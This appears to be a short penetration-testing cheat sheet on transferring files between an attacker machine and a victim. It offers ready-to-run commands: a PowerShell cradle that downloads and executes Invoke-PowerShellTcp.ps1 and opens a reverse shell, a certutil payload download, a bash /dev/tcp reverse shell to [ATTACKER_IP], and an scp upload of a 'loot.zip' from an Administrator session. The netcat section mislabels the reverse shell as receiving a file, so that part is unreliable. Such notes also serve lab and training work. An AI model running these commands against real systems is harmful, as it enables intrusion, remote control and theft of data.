# File sharing 

## From attacker machine

### Web server exposing files

1. Create a web server in your local 
```bash
php -S localhost:8090

python -m http.server 8090

python -m SimpleHTTPServer 8090
```  

2. Visit the url in the victim machine to download the file 
```bash
# Linux
wget http://[IP_ATTACKER]/file

# Windows
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');

Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

certutil -urlcache -f http://ip/file c:\windows\temp\file
```

### Using a share

1. Start a share in your kali system

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

2. Retrieve the data while on the victim machine

```bash
copy \\[ATTACKER_IP]\kali\somefile /path/somefile
```

### Using stream with netcat

1. Send file to a machine
```bash
nc -w -3 [VICTIM_IP] [PORT] < LinEnum.sh
```

2. In the victim machine, receive the data
```bash
/bin/bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1
```

### Using SSH on Kali 

1. Start SSH in the attack machine

```bash
root@kali:# systemctl start ssh.socket
```

2. In the victim machine, copy the file across

```bash
PS C:\Users\Administrator> scp .\20200609093439_loot.zip root@10.9.17.195:/root/loot.zip
The authenticity of host '10.9.17.195 (10.9.17.195)' can't be established.
ECDSA key fingerprint is SHA256:j2rFIhm/IhhKmKwx5YTtx70Ox8mpS+Qd8dskUOiXPD4.
Are you sure you want to continue connecting (yes/no)?
Warning: Permanently added '10.9.17.195' (ECDSA) to the list of known hosts.
root@10.9.17.195's password:
20200609093439_loot.zip                                                                                                                                                                                  100% 9537   298.1KB/s   00:00
```


